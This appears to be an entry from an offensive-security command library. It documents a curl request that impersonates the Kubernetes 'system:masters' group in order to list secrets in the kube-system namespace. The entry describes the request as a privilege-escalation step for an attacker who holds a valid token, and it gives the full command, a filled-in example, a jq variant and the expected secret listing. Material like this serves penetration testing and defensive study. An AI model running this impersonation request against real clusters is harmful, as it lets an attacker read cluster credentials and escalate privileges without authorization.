---
id: a882b737-b5af-462f-be8b-44e30945896b
name: curl-kubernetes-impersonate-masters-group
type: command
executor: bash
data: >-
  curl -k -v -XGET -H "Authorization: Bearer $_JWT_TOKEN" -H "Impersonate-Group:
  system:masters" -H "Impersonate-User: null" -H "Accept: application/json"
  https://$_MASTER_IP:$_PORT/api/v1/namespaces/kube-system/secrets/
output: null
created_at: '2023-04-06T03:56:01.334028+00:00'
updated_at: '2023-04-10T20:34:06.537784+00:00'
platforms:
  - Kubernetes
tags:
  - impersonation
  - rbac
verified: true
validated: true
---

# curl-kubernetes-impersonate-masters-group

## Command

```bash
curl -k -v -XGET -H "Authorization: Bearer $_JWT_TOKEN" -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json" https://$_MASTER_IP:$_PORT/api/v1/namespaces/kube-system/secrets/
```

## Description

This command uses curl to send an authenticated GET request to the Kubernetes API server, impersonating the privileged 'system:masters' group to list secrets in the kube-system namespace. It is used in privilege escalation scenarios where an attacker has a valid JWT but needs elevated RBAC access to sensitive cluster resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_JWT_TOKEN | Valid JWT token from an impersonator account (e.g., service account token) | Yes |
| $_MASTER_IP | IP address of the Kubernetes master/API server | Yes |
| $_PORT | Port of the API server (default 6443) | Yes |
| -k | Skip SSL certificate verification (for self-signed certs) | Built-in |
| -v | Enable verbose output for debugging | Built-in |
| -XGET | Specify HTTP GET method | Built-in |
| -H "Authorization: Bearer ..." | Set bearer token for authentication | Built-in |
| -H "Impersonate-Group: system:masters" | Impersonate the privileged masters group | Built-in |
| -H "Impersonate-User: null" | Do not change the user identity (use original) | Built-in |
| -H "Accept: application/json" | Request JSON response format | Built-in |

## Examples

### Basic Usage

```bash
curl -k -v -XGET -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9..." -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json" https://192.168.1.100:6443/api/v1/namespaces/kube-system/secrets/
```

### Advanced Usage

Pipe output to jq for parsing:

```bash
curl -k -v -XGET -H "Authorization: Bearer $_JWT_TOKEN" -H "Impersonate-Group: system:masters" -H "Impersonate-User: null" -H "Accept: application/json" https://$_MASTER_IP:$_PORT/api/v1/namespaces/kube-system/secrets/ | jq '.items[] | .metadata.name'
```

## Expected Output

Successful execution returns a JSON array of secrets:

```json
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {...},
  "items": [
    {
      "metadata": {
        "name": "default-token-abc123",
        "namespace": "kube-system"
      },
      "type": "kubernetes.io/service-account-token"
    }
  ]
}
```

Failures may return 401 Unauthorized (invalid JWT) or 403 Forbidden (RBAC denial).

## Related

- [[procedures/Kubernetes-RBAC-Privileged-Account-Impersonation]]
